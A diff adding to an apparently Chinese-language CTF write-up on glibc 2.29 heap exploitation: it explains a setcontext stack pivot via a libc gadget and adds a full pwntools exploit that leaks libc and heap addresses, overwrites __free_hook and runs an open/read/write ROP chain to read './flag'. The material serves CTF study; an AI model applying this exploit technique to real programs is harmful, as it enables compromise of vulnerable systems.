@@ -1130,7 +1130,199 @@ add(0x28,p64(magic_gadget)) # 73
 
 因为有 chunk overlapping，所以其实挺容易控制 next 指针的，比如通过上面这样的方法就可以分配到 __free_hook 了。
 
-到这里就结束了堆上的利用，之后的白名单绕过这里不再赘述，详见《沙箱逃逸》目录下的《C 沙盒逃逸》
+到这里就结束了堆上的利用，之后需要进行白名单绕过,我们只可以注入一个 gadget 到 __free_hook，而我们希望这个 gadget 能够实现栈迁移
+一般考虑使用 setcontext 函数来进行栈迁移，其实现为
+
+```
+.text:0000000000055E00 ; __unwind {
+.text:0000000000055E00                 push    rdi
+.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset
+.text:0000000000055E08                 xor     edx, edx        ; oset
+.text:0000000000055E0A                 mov     edi, 2          ; how
+.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize
+.text:0000000000055E15                 mov     eax, 0Eh
+.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask
+.text:0000000000055E1C                 pop     rdx
+.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
+.text:0000000000055E23                 jnb     short loc_55E80
+.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
+.text:0000000000055E2C                 fldenv  byte ptr [rcx]
+.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
+.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
+.text:0000000000055E3C                 mov     rbx, [rdx+80h]
+.text:0000000000055E43                 mov     rbp, [rdx+78h]
+.text:0000000000055E47                 mov     r12, [rdx+48h]
+.text:0000000000055E4B                 mov     r13, [rdx+50h]
+.text:0000000000055E4F                 mov     r14, [rdx+58h]
+.text:0000000000055E53                 mov     r15, [rdx+60h]
+.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
+.text:0000000000055E5E                 push    rcx
+.text:0000000000055E5F                 mov     rsi, [rdx+70h]
+.text:0000000000055E63                 mov     rdi, [rdx+68h]
+.text:0000000000055E67                 mov     rcx, [rdx+98h]
+.text:0000000000055E6E                 mov     r8, [rdx+28h]
+.text:0000000000055E72                 mov     r9, [rdx+30h]
+.text:0000000000055E76                 mov     rdx, [rdx+88h]
+.text:0000000000055E76 ; } // starts at 55E00
+```
+
+从偏移 `0x55E35` 开始以 rdx 为基基数对许多寄存器进行了赋值，也就是说如果控制了 rdx，那么就可以实现栈迁移。然而比较讨厌的是，rdx 我们无法直接控制，只能控制 rdi，幸好比较巧合的，在 libc 中有这样一个 gadget
+
+```
+0x12be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
+```
+
+通过使用这个 gadget 之后改变 rdx，ret 到 setcontext 之后就可以 rop 了（这个 chunk 无法通过 ROPgadget 找出，需要使用 ropper）。
+
+### exp
+
+```python
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+context.terminal = ["tmux","splitw","-h"]
+context.log_level = 'debug'
+
+#sh = process("./note")
+#libc = ELF("/glibc/2.29/64/lib/libc.so.6")
+sh = process("./note-re")
+libc = ELF("./libc-2.29.so")
+
+def add(size,payload):
+    sh.sendlineafter("Choice: ",'1')
+    sh.sendlineafter("Size: ",str(size))
+    sh.sendafter("Content: ",payload)
+
+def delete(index):
+    sh.sendlineafter("Choice: ",'2')
+    sh.sendlineafter("Idx: ",str(index))
+
+def show(index):
+    sh.sendlineafter("Choice: ",'3')
+    sh.sendlineafter("Idx: ",str(index))
+
+for i in range(16):
+    add(0x10,'fill')
+
+for i in range(16):
+    add(0x60,'fill')
+
+for i in range(9):
+    add(0x70,'fill')
+
+for i in range(5):
+    add(0xC0,'fill')
+
+for i in range(2):
+    add(0xE0,'fill')
+
+add(0x170,'fill')
+add(0x190,'fill')
+# 49
+
+add(0x2A50,'addralign') # 50
+#add(0x4A50,'addralign') # 50
+
+add(0xFF8,'large bin') # 51
+add(0x18,'protect') # 52
+
+
+delete(51)
+add(0x2000,'push to large bin') # 51
+add(0x28,p64(0) + p64(0x241) + '\x28') # 53 fd->bk : 0xA0 - 0x18
+
+add(0x28,'pass-loss control') # 54
+add(0xF8,'pass') # 55
+add(0x28,'pass') # 56
+add(0x28,'pass') # 57
+add(0x28,'pass') # 58
+add(0x28,'pass') # 59
+add(0x28,'pass-loss control') # 60
+add(0x4F8,'to be off-by-null') # 61
+
+for i in range(7):
+    add(0x28,'tcache')
+for i in range(7):
+    delete(61 + 1 + i)
+
+delete(54)
+delete(60)
+delete(53)
+
+for i in range(7):
+    add(0x28,'tcache')
+
+# 53,54,60,62,63,64,65
+
+add(0x28,'\x10') # 53->66
+## stashed ##
+add(0x28,'\x10') # 54->67
+add(0x28,'a' * 0x20 + p64(0x240)) # 60->68
+delete(61)
+
+add(0x140,'pass') # 61
+show(56)
+libc_base = u64(sh.recv(6).ljust(0x8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60
+log.success("libc_base:" + hex(libc_base))
+__free_hook_addr = libc_base + libc.sym["__free_hook"]
+
+add(0x28,'pass') # 69<-56
+add(0x28,'pass') # 70<-57
+delete(70)
+delete(69)
+show(56)
+heap_base = u64(sh.recv(6).ljust(0x8,'\x00')) - 0x1A0
+log.success("heap_base:" + hex(heap_base))
+
+add(0x28,p64(0) * 2) # 69<-56
+add(0x28,p64(0) * 2) # 70<-57
+add(0x28,p64(0) * 2) # 71<-58
+delete(68)
+add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
+add(0x28,'pass') # 72
+## alloc to __free_hook ##
+magic_gadget = libc_base + 0x12be97
+add(0x28,p64(magic_gadget)) # 73
+
+pop_rdi_ret = libc_base + 0x26542
+pop_rsi_ret = libc_base + 0x26f9e
+pop_rdx_ret = libc_base + 0x12bda6
+syscall_ret = libc_base + 0xcf6c5
+pop_rax_ret = libc_base + 0x47cf8
+ret = libc_base + 0xc18ff
+
+payload_addr = heap_base + 0x270
+str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
+rw_addr = heap_base 
+
+payload = p64(libc_base + 0x55E35) # rax
+payload += p64(payload_addr - 0xA0 + 0x10) # rdx
+payload += p64(payload_addr + 0x28)
+payload += p64(ret)
+payload += ''.ljust(0x8,'\x00')
+
+rop_chain = ''
+rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
+rop_chain += p64(pop_rsi_ret) + p64(0)
+rop_chain += p64(pop_rdx_ret) + p64(0)
+rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
+rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
+rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
+rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
+rop_chain += p64(libc_base + libc.symbols["read"])
+rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
+rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
+rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
+rop_chain += p64(libc_base + libc.symbols["write"])
+
+payload += rop_chain
+payload += './flag\x00'
+add(len(payload) + 0x10,payload) # 74
+#gdb.attach(proc.pidof(sh)[0])
+delete(74)
+
+
+sh.interactive()
 
 ### exploit
 ```python
